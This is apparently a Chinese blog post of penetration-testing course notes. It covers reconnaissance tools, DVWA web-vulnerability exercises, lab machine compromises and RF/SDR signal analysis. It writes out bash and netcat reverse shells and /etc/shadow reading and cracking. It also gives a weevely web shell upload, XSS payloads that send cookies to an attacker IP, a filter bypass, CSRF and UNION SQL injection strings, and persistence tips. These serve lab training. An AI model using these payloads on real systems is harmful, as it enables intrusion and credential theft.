---
title: 實習筆記-滲透測試課程
description: 實習時的滲透測試課程也稍微紀錄一下
toc: true
tags: ['Penetration Testing']
categories: ['學習筆記']
date: 2022-01-10T11:07:06+08:00
top_img: https://i.imgur.com/zuXQ4RA.jpg
aside: true
---

課程內容:
```
- Web基本知識
- 主動/被動資訊收集
- 常見的web漏洞
- 靶機
- DVWA（Damn Vulnerable Web Application）
- RF(無線射頻)滲透測試(物聯網)
- 基本的通訊協定
- 軟體定義無線電SDR
```


## PT(滲透測試) vs RT(紅隊演練)
- PT:範圍較小，且無法針對社交工程 ex.某個網頁
- RT:範圍較大 ex.整個公司

黑箱:最貼近真實情境
白箱:盡可能提供相關資訊給受測者
灰箱:黑白箱混和，會提供自我宣告表以後再給受測者測試

## 滲透測試流程:
1. 資料蒐集
2. 透洞掃描
3. 漏洞利用
    白帽:
    4. 漏洞回報
    黑帽:
    4. 提權限
    5. 持續性存取
    6. 防禦逃脫(逃脫會叫的那種警報器)
    7. 資料攜出(把DB分批攜出)
![](https://i.imgur.com/10o9kG8.jpg)

## IOT的攻擊向量(Attack Vector)
![](https://i.imgur.com/CFMACnJ.jpg)
- Hardware:Physical Interface
    給開發人員使用，出廠後並未關掉，若能訪問到該接口通常都能直接取得root，通常底層皆為明文傳輸
    - 設備外殼並未提供保護機制
    - 底層使用明文傳輸
    - 毛刺攻擊(Glitching):用微小的電壓，去擾動硬體設備
    - 測信到攻擊(Side Channel Attack):加密晶片，可以去量測他的電壓、音頻...，用這些東西去分析加密的方式、Key等等
- 韌體(Firmware):Hardcode, Enc key, exploit
    - 軟體/韌體未進行加密
    - 有敏感資料
- Software:Andriod app
- Radio:Cellular, WiFi, 蜂窩網路
    - 無線通訊未加密可進行嗅探(Sniffer)
    - 干擾攻擊(Jamming)
    - 重放攻擊
    - 模糊攻擊(fuzz):需先擬向工程才能fuzz
    - 通訊協定:最麻煩，需要原廠處理
- Cloud:
    - API攻擊
    - 注入攻擊
    - 身分認證/授權機制
    - 邏輯漏洞
    - web漏洞

## 網頁的攻擊向量
![](https://i.imgur.com/zfkdfrI.jpg)
Web1.0
- 布告欄的概念
- 只有靜態網頁

Web2.0
- 可讀寫，多功能的動態頁面
- 應用程序
- DB(個資)
- API
- 不同用戶會有不同的頁面

Web3.0
- 去中心化(資料分散放)

HTTP
- 由Request/Response組成
- 由於HTTP屬於無狀態，因此需依賴cookie機制來記錄user資訊與time
- 狀態碼
    ![](https://i.imgur.com/Bk1hb59.png)

## 攻擊標的
1. 使用者身分
- 認證
- 權限劃分
- Session
ex.HTTP封包格式皆相同，該基站

2. 輸入輸出:
- Sql Injection
- Command Injection
- 需經過正規化處理
- 開發者需要設定確定的字元
ex. 數字欄位填中文或英文

3. 程式邏輯


## 常用工具:
Information Gathering:分為主動、被動
- 主動資訊蒐集
    ![](https://i.imgur.com/M9nPHnv.png)
    - nmap主動蒐集目標資訊:掃描目標主機port
        ![](https://i.imgur.com/GTvO6kr.jpg)
    - Nikto開源的網站弱點掃描工具:自帶在Kali內
    - Dirb暴力枚舉網頁下的目錄與檔案
        ```
        dirb url
        #去看網頁內存不存在敏感資料
        #有可能可以掃出使用者的路徑
        #如果有開阿帕契作為中繼站，能掃出來
        ```
- 被動資訊蒐集
    - 用被動資料(IP、姓名、生日..)來描述目標
    - 不與目標直接接觸，避免留下痕跡
    - SHODAN
        - 可以掃描世界上所有的物聯網設備
        - 主機
        - 開啟端口
        - 是否有已知漏洞
        - 可使用下方關鍵字搜尋:
            - hostname：搜尋指定的主機或域名，例如 hostname:"google"
            - port：搜尋指定的埠或服務，例如 port:"21"
            - country：搜尋指定的國家，例如 country:"CN"
            - city：搜尋指定的城市，例如 city:"Hefei"
            - org：搜尋指定的組織或公司，例如 org:"google"
            - isp：搜尋指定的ISP供應商，例如 isp:"China Telecom"
            - product：搜尋指定的作業系統/軟體/平臺，例如 product:"Apache httpd"
            - version：搜尋指定的軟體版本，例如 version:"1.6.2"
            - geo：搜尋指定的地理位置，引數為經緯度，例如 geo:"31.8639, 117.2808"
            - before/after：搜尋指定收錄時間前後的資料，格式為dd-mm-yy，例如 before:"11-11-15"
            - net：搜尋指定的IP地址或子網，例如net:"210.45.240.0/24"
            - 參考:
                - https://www.tp1rc.edu.tw/tpnet2020/training/1090303.pdf
                - https://www.itread01.com/content/1546699324.html
            
    - Google Hacking
        - 用Google Search針對目標進行情報搜尋
        - 用"site:"去搜尋

- 過濾封包
    - Burp Suite
        使用方法:
        使用Kali 開啟Burp Site
        ![](https://i.imgur.com/8gomHwp.png)
        開啟proxy 表示之後所有流量都會經過burp
        <之前的版本需要簽憑證>
        使用Proxy開啟browser
        ![](https://i.imgur.com/dWxhFur.png)
        進到project option>MIST>勾選Enable
        ![](https://i.imgur.com/vswHeoq.png)
        就可以繼續使用proxy
        ![](https://i.imgur.com/HwXBX1w.png)
        將IPor網址執行於瀏覽器中，封包就會被攔截進brower
        ![](https://i.imgur.com/OATh3RT.png)
        <br><br>

- 暴力破解
    ![](https://i.imgur.com/YuudCcZ.png)
    ![](https://i.imgur.com/kf2mOL5.png)
    不同的Attack type有不同模式
    sniper:針對字典中設定的值交替順序測試
    ![](https://i.imgur.com/An2qwjw.png)
    將存取內容傳到Repeater確認回應結果
    ![](https://i.imgur.com/Tgird85.png)

    ![](https://i.imgur.com/nwWHDyM.png)

<br>

## Command Injection
因為沒有針對用戶輸入進行過濾，因此會造成機敏資料外洩、等問題
Linux command


| Column 1 | Column 2 | 
| -------- | -------- | 
| ; or &     | 不管第一次執行的指令是否成功皆會執行第二個     | 
| &&     | 第一個指令失敗不會執行下一個     | 
|  I(槓槓符號)    | 會把前一個指令的輸出當作下一個指令的輸入     |
|  II(槓槓符號)    | 會把前一個指令的輸出當作下一個指令的輸入     |


---

## DVWA
1.Enter IP to get shell

![](https://i.imgur.com/GZG7eOA.png)
可使用command加入一些linux指令
![](https://i.imgur.com/FI8yUNJ.png)

![](https://i.imgur.com/33iCHlV.png)
cat去撈 /etc/shadow
![](https://i.imgur.com/zthZGDt.png)
ls -al 查看檔案權限
![](https://i.imgur.com/Fl5HR9S.png)

ls -al | grep shadow
linux
/etc/passwd linux以前會把所有帳密放在裡面
/etc/shadow 現在linux會將它分開

#### *Reverse shell*
受害者的機器自行連回攻擊者的機器(出來比進去簡單)

**Bash**
- Victim: bash -i >& /dev/tcp/ip/port 0>&1
- Attacker:nc -nvlp port

**Netcat**
- Victim:nc ip port -e /bin/bash
- Attacker:nc -nvlp port

![](https://i.imgur.com/WHPfdBH.png)

**john the ripper**暴力破解
可以參考Linux 的 /etc/shadow 檔案結構
https://blog.gtwang.org/linux/linux-etc-shadow-file-format/

xdg-open >> 呈現file讓你可以直接開啟文件

<br>

**破解liunx root密碼**
將passwd和shadow合併 寫入crack中
```
unshadow passwd shadow > crack
```
![](https://i.imgur.com/vRRh7bK.png)
使用john來破解密碼
![](https://i.imgur.com/JiAkG0d.png)

**破解Window root密碼**
SAM file
NTLM hash
Net-NTLM 網路上做金鑰交換的地方

**CVE Details**
可以去追蹤
不會有要怎麼利用該漏洞的程式碼
**Expoitdb**
可以追蹤漏洞
remote code execution(RCE)遠程代碼執行漏洞

**Metasploit**
https://ithelp.ithome.com.tw/articles/10224527


```
msfconsole
```
![](https://i.imgur.com/fGYsqLW.png)

![](https://i.imgur.com/nUGB4m6.png)


## 靶機測試(192.168.5.107)
### NET config
網路要使用橋接介面卡

1. <資料蒐集>先測試受害機的port有什麼是開啟的
使用nmap查看已開啟的port
![](https://i.imgur.com/4YYhxLY.png)
可以查看bin裡面有什麼command可以使用
![](https://i.imgur.com/5HngrIj.png)

2. <利用弱點>登入
使用SQL Injection去登入

3. 使用受害者電腦連回攻擊者電腦
可使用下方這兩個去
- bash
- netcat

4. <資料蒐集>蒐集受害者電腦資訊
```
whoami
uname-a
lsb_release -a
```
![](https://i.imgur.com/W7DQDcI.png)

5. <弱點掃描>使用exploitsdb查詢漏洞
    ![](https://i.imgur.com/IajKmAT.png)

    ![](https://i.imgur.com/BFOaibq.png)


6. 在本地電腦開啟apache服務
    ![](https://i.imgur.com/6Cimn6A.png)
    開啟畫面如下
    ![](https://i.imgur.com/TZk5bR6.png)
    將需要的檔案放進apache資料夾中，使得之後受害電腦可以下載apache中的資料
    ![](https://i.imgur.com/AO8UQ2n.png)
    ![](https://i.imgur.com/Pe9lYUr.png)

7. <利用漏洞>在受害者電腦中下載漏洞檔案
    使用pwd確認位址指向tmp
    (由於權限不足因此需要找一個當前權限可以讀寫的位址)
    使用wget下載本機開啟的apache
    ![](https://i.imgur.com/RdeYP6B.png)
    ![](https://i.imgur.com/wVEsi1U.png)
    確認權限
    ![](https://i.imgur.com/oc9Q7jV.png)



### File Upload
使用weevely生成backdoor.php
![](https://i.imgur.com/perGeXy.png)
將檔案上傳回dvwa的網站
![](https://i.imgur.com/uZlHxZq.png)
使用weevely連到該上傳路徑
```
weevely http://IP/dvwa/hackable/uploads/backdoor.php pwd(密碼)
```
![](https://i.imgur.com/PkDJBTn.png)
查看開主機狀態
![](https://i.imgur.com/L9KupbP.png)

<中等難度>
前端會擋非image會擋
先將惡意檔案改成.jpeg

上傳該檔案，使用burp suite攔截封包，並將封包內檔名更改為php即可
![](https://i.imgur.com/DKwFDBe.png)


### LFI(Local File Inclusion)
本地文件包含漏洞(LFI)

敏感檔案:
- **/etc/passwd**
- **/var/log/auth.log**
    - 紀錄哪些user連這台機器
- **/var/log/apacke2/access.log/error.log**
    - 有出現過哪些錯誤訊息
- **../../../**
    - 可以去翻他有那些檔案
- **%WINDIR%\win.ini**
    - win設定檔，可以看config

可以在?page=後面放入**絕對路徑**來查找資料
![](https://i.imgur.com/KLw7zdD.png)

![](https://i.imgur.com/2pHxd91.png)

![](https://i.imgur.com/QGulfsK.png)

### RFI(Remote File Inclusion)
有RFI漏洞
需要開啟funcion:
- allow_url_fopen
- allow_url_include

![](https://i.imgur.com/DDVoXPL.png)

### XSS
跨腳本攻擊(Cross Site Scripting)
攻擊對象為user端，非server端

漏洞利用條件
- 伺服器對用戶提交數據過濾不夠嚴謹
- 使用社交工程讓受害者點擊觸發
影響:
- 重定向(掛馬)不應該被倒到的網站
- 盜取cookie
- 釣魚
類型:
- 反射型:返回腳本並由user要去點擊才會中招
- 儲存型:js code 存在server端，不管user有沒有點擊，都會觸發。

下js code
```
<script>alert("call 911")</script>
```
![](https://i.imgur.com/T3rDDKJ.png)
![](https://i.imgur.com/oOGulM2.png)
```
<script>alert(document.cookie)</script>
```
![](https://i.imgur.com/191wpbd.png)
![](https://i.imgur.com/0T1ttyT.png)

從user那邊偷到訊息傳到攻擊者端
監聽80 port
輸入js code 連到攻擊者IP回傳cookie
```
<script>new image().src="http://ip/output="+document.cookie;</script>
```
![](https://i.imgur.com/Q0T1jW9.png)


<中等難度>
過濾掉script，則可以使用大小寫來混淆他
ex.
```
<sCripT>new image().src="http://ip/output="+document.cookie;</sCripT>
```


![](https://i.imgur.com/4Y4hqwD.png)

![](https://i.imgur.com/e26A9bc.png)

```

```

XSS stored

![](https://i.imgur.com/gJi4QzR.png)

![](https://i.imgur.com/QEBAcB9.png)



## 靶機測試2(192.168.0.182)
1. 蒐集資料
使用dirb蒐集網頁資料

使用nmap -A 查看該主機有甚麼Port是開啟的
![](https://i.imgur.com/M19pxyW.png)
其中可以朝samba掃描/攻擊
(samba的洞挺多的)

2. 開啟msfconsolse
![](https://i.imgur.com/zXZNme2.png)

3. Search samba漏洞
![](https://i.imgur.com/4FDBxJQ.png)

4. 編譯漏洞腳本
![](https://i.imgur.com/4LaDpTB.png)

5. 執行漏洞腳本
![](https://i.imgur.com/97zdWV8.png)
(即可連進去取得root)

要怎麼維持連線程序????
**越貼近使用者行為越好越難發現**
1.	建一個新的帳號
2.	爆破它其他的帳號密碼
3.	塞一個服務 (但有可能會被AD斷掉)
4.	建一個連線回到自己主機 (但有可能會被AD斷掉)

How To Create a Sudo User in Linux?
https://www.digitalocean.com/community/tutorials/how-to-create-a-sudo-user-on-ubuntu-quickstart

### CSRF
攔截修改密碼的頁面
![](https://i.imgur.com/FUBku23.png)

複製封包的URI
![](https://i.imgur.com/1LTXzYP.png)

執行URI即可更改密碼
![](https://i.imgur.com/POuyWXz.png)
將URI拿去縮短網址就能夠更加隱蔽

### XSS+CSRF 組合技
```
<script>new Image().src="更改密碼的URI"</script>
```
- 反射型:點到這個圖片就會被更改
- 儲存型:登入後帶著cookie瀏覽到特定圖片就會被更改

### SQL Injection(脫庫)
server端並未經過過濾使用輸入SQL語法進行解析並將結果返回
SQL基礎使用:
- Select DB
- Select table
- Select column
- Data

登入DB
```
mysql -u root -h IP
show DB;
use dvwa;
show tables;
```
![](https://i.imgur.com/aK34Mju.png)
![](https://i.imgur.com/pmUsGxs.png)

select
![](https://i.imgur.com/2ljNhS8.png)
![](https://i.imgur.com/dmWdah5.png)

Information Schema
- Information_schema.schemata 所有db
- Information_schema.tables 所有table
- Information_schema.columns 所有的欄位

![](https://i.imgur.com/Adjm06U.png)
![](https://i.imgur.com/f6uOTKJ.png)


輸入1會產生ID1的資訊
![](https://i.imgur.com/kpFZTul.png)
因此可以使用select語法輸入所有的db
```
1 ' union select 1, schema_name from information_schema.schemata # 
```
![](https://i.imgur.com/iQecQTk.png)
```
1 ' union select 1, table_name from information_schema.tables # 
```
![](https://i.imgur.com/O5Ba3HO.png)

```
1 ' union select 1, table_name from information_schema.tables where table_name='dvwa'# 
```
![](https://i.imgur.com/sLCOQpN.png)

![](https://i.imgur.com/mRMPxDH.png)

![](https://i.imgur.com/9QEBR9x.png)


---
## 好用資源
- Payload All The Things
https://github.com/swisskyrepo/PayloadsAllTheThings
- GTFObins: 各種Reverse Shell
https://gtfobins.github.io/
- XSS Bypass Filter
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

----
## RF 滲透測試

安裝基本套件
```
sudo apt-get install gnuradio 
sudo apt-get install gr-osmosdr
sudo apt-get install rtl-sdr
rtl_test
```
![](https://i.imgur.com/Dpat9WW.png)

**開啟osmocom_fft**
osmocom_fft
![](https://i.imgur.com/Ewe4E1Y.png)

### 通訊概論
訊號：
- 類比訊號(陸譯:模擬訊號):根據震幅的改變而產生的訊號，可以用來乘載訊號
    - 赫茲(Hz):每秒震盪幾次
- 數位訊號:表示為0or1，不是用來乘載訊息的

頻率:每秒震盪幾次，每秒周期數
頻寬:用來描述頻率的範圍，又稱為帶寬

fft 演算法:
- 中心頻率(Center Frequency):(f max + f min)/2
- 頻寬(Bandwideth, channel width): |f max- f min|

頻譜分配:
![](https://i.imgur.com/YFYcJnm.png)

ISM頻段:
- 無需使用執照與向政府繳交費用
- 2.4GHz, 868Mhz

Sub -1G頻段:
- 小於1GHz的頻段被稱為Sub -1GHz


發收端:調變->訊息X載波=訊號
接收端:解調變
- 類比調變
    - 頻率調變(FM):利用訊號頻率密度來表示
    - 振幅調變(AM):利用訊號震幅高低表示
    - 相位調變(PM):利用不同的相位(角度)來表示
- 數位調變
    - 振幅偏移調變(ASK)
    - 頻率偏移調變(FSK)
    - 相位偏移調變(PSK)
    - 正交分多工調變(OFDM) ex.WiFi
- 比較
    ![](https://i.imgur.com/dY7rAqQ.jpg)

單工:純接收、純發射
半雙工:接收發射同時間下能擇一 ex.無線電
雙工:同時間下能透發射&接收 ex.手機

電流:
導體上的電流 - 發射機(Tx) -> air interface -> 接收機(Rx) - 導體上的電流

Wireless IC Dongle
![](https://i.imgur.com/1ZEd9lh.jpg)
SDR Flatforms
![](https://i.imgur.com/W28jivl.jpg)

Wireless IC Dongle VS SDR Flatforms
- Wireless IC Dongle:收到訊號以後，將已解調訊號傳至電腦
- SDR Flatforms:收到訊號以後，將未解調訊號傳至電腦

增益VS損耗
- 增益(Gain):輸出的訊號>輸入的訊號 ,根據質量守恆定理，訊號不會無緣無故變大，因此會經過電流加大訊號
- 損耗(Loss):輸入的訊號>輸出的訊號 ,透過發熱進行能量守恆的轉換

使用分貝當作比較的條件

採樣定理:
將一個類比訊號經過採樣轉換成一個數位訊號，需要用幾個點表示一個波?
> <fs採樣率  f採樣頻率 B頻寬>
1. 低通採樣定理:採樣率至少為採樣頻率的兩倍
    fs = 2 x f
2. 帶通採樣定理:採樣率至少為頻寬的兩倍
    fs = 2 x B

- 抽取(Decimation):降低採樣率
- 內插(Interpolation):提高採樣率

- 混疊現象(Aliasing Effect):會發生在訊號中心頻率+-採樣率的頻率


匹配:
- 射頻訊號 阻抗 50 Ω(Ohm）
- 視頻訊號 阻抗 75 Ω(Ohm)
- 匹配不良:射頻信號會有反射問題，嚴重的話可能會燒掉

```
gnuradio-companion
```
![](https://i.imgur.com/oKM0usX.png)

圖中每一個都是功能模組相連
NBFM Receive為解調訊號的Seceive，沒有它就不會work
![](https://i.imgur.com/03kHTTz.png)

開啟一個新的流程圖
File>New>WX GUI
![](https://i.imgur.com/zvMNJRR.png)
區域介紹
![](https://i.imgur.com/o05gLr3.png)
RTL-SDR參數設定
![](https://i.imgur.com/UCRfAXd.png)
可以更改變數，使所有和samp_rate之變數全部更改
![](https://i.imgur.com/GgUS5UZ.png)


將rtl收到的所有訊號存到file
![](https://i.imgur.com/bKGy7Eq.png)
給file_sink儲存的位址
![](https://i.imgur.com/gAJTMBu.png)

```
inspectrum <file>
```
![](https://i.imgur.com/Jf8QIdk.png)

### 元件
有源:需要電源運作
無源:不須電源運作

- 放大器:
    - 三種屬性:增益、噪聲係數、線性
        - Gain:使用dB表示
        - 噪聲係數:使用dB表示
        - 線性:失真程度
    - 三類:低噪音、高功率、其他

- 天線
    - 天線:接收訊號與發射訊號
        - 全向天線:全樣都有
        - 指向天線:只有一個角度
        - 增益天線:捨去電磁場﹑非功率增益而是方向增益
        - 主動天線:必含功率增益
    - 頻率:決定天線的大小
    - 傳播方向:決定天性的形狀
        - 全向:全樣都有
        - 指向:只有一個角度
    - 功率:決定天線的大小

- 濾波器
    - 已"頻率"劃分不同訊號
    ![](https://i.imgur.com/A44cWOA.jpg)
    - 頻率響應:超過他的憑率較果會下降
    - 過濾你不要的頻率

- 混頻器:
    - 改變訊號頻率，但保持其他特性，也就是做調變的功能
    - 通常混頻器後面會接一個濾波器
    - 比較沒辦法數位化
- 振盪器:
    - 比較沒辦法數位化
- 元件比較
    ![](https://i.imgur.com/sQIJs7D.jpg)
- 元件溝通
    - 發射機
    ![](https://i.imgur.com/DrcyGdD.jpg)
    
    - 接收機

### 逆向工程

流程:
1. Find the signal
2. Capture the signal
2. Analyze the signal

#### Analyze the signal:
- 前導碼(Preamble):告訴雙方要準備連線了
    - 常見的的:0xaaaa, 0x5555
- 同步碼(Sync Word):我現在開始要傳資料了喔!
    - 堂見的:0xd391

![](https://i.imgur.com/naYlFWK.png)


![](https://i.imgur.com/LzH7Dfk.png)

> FFT size:調整頻率軸縮放
> Zoom:調整時間
> Power Max:調整訊號顯示
> Power Min:調整背景噪音顯示
調整Zoom & FFT size
![](https://i.imgur.com/COKLijI.jpg)

![](https://i.imgur.com/GEQlM5t.png)
讓紅線貼近訊號
![](https://i.imgur.com/MNNMpqH.png)

可以看見下方的振幅(綠色的線)
![](https://i.imgur.com/aEW6fvE.jpg)

#### urh 訊號分析
![](https://i.imgur.com/cmzuK6s.png)
analysis
![](https://i.imgur.com/aGQYkkS.png)

### 分析練習

#### Doorball練習
frequency 240~960MHz

modulation OOK(One of Key 是ASK的一種) or ASK

preamble size 0
preamble 0x55 or 0xaa

Sync size 32bits
Sync Word 0x80000000

Packet Structure:
Sync+(0x8eee8ee88eee888e888888e88)*39+0x8eee8ee88eee888e888888e8

了解封包結構以後，接下來就是可以去模擬一個類似的packet structure回傳給IOT裝置，如果原先的訊號沒有過濾需要的值，也就是說在Data的部分更改長度or更改內容，IOT會不會爆掉

PWM
- 高高低1
- 高低低0
- PWM 逼碼常與ASK進行調變
- bit rate= baud rate / 3 = symbol rate / 3
Manchester慢測試
- 高電壓到低電壓是0
- 低電壓到高電壓是1
- bit rate = baud rate / 2 = symbol /2

#### Unknow練習
- Identify Application
    - remote controlled car application
- Identify Modulation Type
    - ASK/OOK
- Identify Preamble
    - No
- Identify Sync Word
    - 4*W2 or W2都行
- Identify Encoding
    - NRZ (常與ASK做調變 but this case 例外)

- Identify 4 Signal Function
    - ![](https://i.imgur.com/cZLi4qY.png)
    - 上 w2x4 + w1x10
    - 下 w2x4 + w1x40
    - 右 w2x4 + w1x64
    - 左 w2x4 + w1x58
- Identify Packet Structure
![](https://i.imgur.com/3oTSfia.png)
![](https://i.imgur.com/GokBAQ8.png)


## apache2 server
**Reference**
https://ubuntu.com/tutorials/install-and-configure-apache#2-installing-apache
https://www.cyberciti.biz/faq/star-stop-restart-apache2-webserver/
- install
```
sudo apt update
sudo apt install apache2
```
- start
```
# sudo /etc/init.d/apache2 start
```
- restart
```
# sudo /etc/init.d/apache2 restart
```
- stop
```
# sudo /etc/init.d/apache2 stop
```